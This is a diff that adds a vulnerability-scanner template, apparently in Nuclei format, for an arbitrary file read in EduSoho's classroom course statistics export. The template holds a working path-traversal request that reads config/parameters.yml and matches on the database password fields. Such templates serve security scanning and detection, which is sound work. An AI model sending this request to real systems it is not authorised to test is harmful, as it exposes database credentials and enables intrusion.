@@ -1,0 +1,27 @@
+id: edusoho-classroom-course-statistics-file-read
+info:
+  name: EduSoho Classroom Course Statistics Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    EduSoho Classroom Course Statistics endpoint allows for arbitrary file read due to improper input validation.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "database_driver"
+          - "database_password"
+      - type: word
+        part: header
+        words:
+          - "text/csv"
